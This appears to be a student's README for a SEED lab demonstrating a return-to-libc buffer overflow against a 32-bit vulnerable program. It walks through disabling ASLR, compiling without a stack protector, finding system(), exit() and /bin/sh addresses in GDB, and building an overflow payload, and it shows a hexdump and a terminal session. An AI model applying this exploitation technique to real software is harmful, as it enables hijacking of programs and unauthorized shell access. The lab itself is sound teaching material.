# Lab2-Libc-Attack

This lab demonstrates a **Return-to-libc** exploitation technique on a **32-bit Linux** system. The objective is to exploit a vulnerable program (`retlib`) with a non-executable stack by reusing existing `libc` functions (`system()` and `exit()`) to execute `/bin/sh`, without injecting shellcode.

## Overview

This project implements a classic stack-based buffer overflow to demonstrate a **Return-to-libc (ret2libc)** attack on a 32-bit Linux binary with a non-executable stack (NX bit).

**Key Objectives:**
- Demonstrate a buffer overflow vulnerability.
- Bypass stack execution protections (NX) by reusing existing code from `libc`.
- Successfully spawn a `/bin/sh` shell by overwriting the return address to call `system()`.
- Illustrate stack frame layout and function call conventions in 32-bit x86.

## Prerequisites
- 32-bit Linux VM (lab environment)
- `gcc` with multilib support (if building 32-bit on a 64-bit host)
- Python 3
- GDB (with **peda** or similar is helpful)
- Example seed image: [https://seedsecuritylabs.org/lab_env.html](https://seedsecuritylabs.org/lab_env.html)

## Repository Files
| File | Description |
|------|-------------|
| `retlib.c` | Vulnerable program with a stack-based buffer overflow. |
| `envaddr.c` | Helper utility to print the address of an environment variable. |
| `exploit.py` | Python script to generate the `badfile` payload. |
| `badfile` | Binary payload file generated by `exploit.py`. |
| `README.md` | This documentation. |
| `images/` | Screenshots of the exploitation process. |

### Image References
- `images/01-envaddr.png`: Output of the `envaddr` helper program.
- `images/02-hexdump.png`: Hexdump of the `badfile` payload.

## Exploitation Flow
The attack bypasses the non-executable stack by overwriting the saved return address to point to the `system()` function in `libc`.

1. **Disable ASLR**
   - Run: `echo 0 > /proc/sys/kernel/randomize_va_space` (as root) for stable `libc` addresses.

2. **Find Target Addresses**
   - Set environment variable: `export MYSHELL=/bin/sh`.
   - Use `envaddr` or GDB to find the runtime address of `"/bin/sh"`.
   - Use GDB on `retlib` to find `system()` and `exit()` addresses in `libc`.

3. **Construct Payload**
   - The `exploit.py` script creates `badfile` to overflow the `buffer` in `bof()` and overwrite the stack frame.
   - **Payload Layout:**
[ A * (Offset to EBP) ] + [ Saved EBP ] + [ system_addr ] + [ exit_addr ] + [ sh_addr ]
text- Fills the buffer, restores saved EBP, and hijacks the return address.

4. **Execute Exploit**
- `retlib` reads `badfile`, triggering the overflow.
- On return, control flows to `system()`, executing `/bin/sh`.
- `exit()` ensures clean termination.

## How to Compile and Run
### 1. Disable ASLR (as root)
```bash
echo 0 > /proc/sys/kernel/randomize_va_space
2. Compile (32-bit)
bashgcc -m32 -o retlib retlib.c -fno-stack-protector -z noexecstack
gcc -m32 -o envaddr envaddr.c
3. Get Addresses
bashexport MYSHELL=/bin/sh
./envaddr
# Example output: Address: 0xbfffff01
gdb -q ./retlib
(gdb) p (void*) system
# Example: $1 = (void *) 0xb7da4da0 <__libc_system>
(gdb) p (void*) exit
# Example: $2 = (void *) 0xb7d989d0 <__GI_exit>
4. Build and Run Exploit
Update exploit.py with addresses from Step 3.
bashpython3 exploit.py
./retlib
Example Output
bash[10/02/25]seed@VM:~/Desktop$ python3 exploit.py
[10/02/25]seed@VM:~/Desktop$ hexdump -C badfile | tail
00000000  aa aa aa aa aa aa aa aa  aa aa aa aa aa aa aa aa  |................|
*
00000110  aa aa aa aa aa aa aa aa  aa aa 48 f3 ff bf a0 4d  |..........H....M|
00000120  da b7 d0 89 d9 b7 fd fe  ff bf                    |..........|
0000012a
[10/02/25]seed@VM:~/Desktop$ ./retlib
Address of input[] inside main():  0xbfffef70
Input size: 298
Address of buffer[] inside bof():  0xbfffee3e
Frame Pointer value inside bof():  0xbfffef58
[10/02/25]seed@VM:~/Desktop$ whoami
seed
[10/02/25]seed@VM:~/Desktop$ echo $?
0
Step-by-Step Demonstration

Get Target Addresses

Use envaddr for /bin/sh address and GDB for system() and exit().


Payload Generation

exploit.py generates badfile. Hexdump shows system, exit, and /bin/sh addresses in little-endian.


Successful Exploit

Running ./retlib consumes badfile, overflows the buffer, and spawns a shell (whoami returns seed).



Summary of Results

Task: Use Return-to-libc to execute /bin/sh in a 32-bit program with a non-executable stack.
Result: Success â€” system("/bin/sh") spawned an interactive shell.
Key Lessons:

Use process-specific /bin/sh address due to differing environment layouts.
Restore saved EBP to prevent stack corruption by the leave instruction.
Keep ASLR disabled for predictable addresses in a lab environment.



Author
Prepared by: Abdulrahman ALQunaibit
Lab date: October 2, 2025
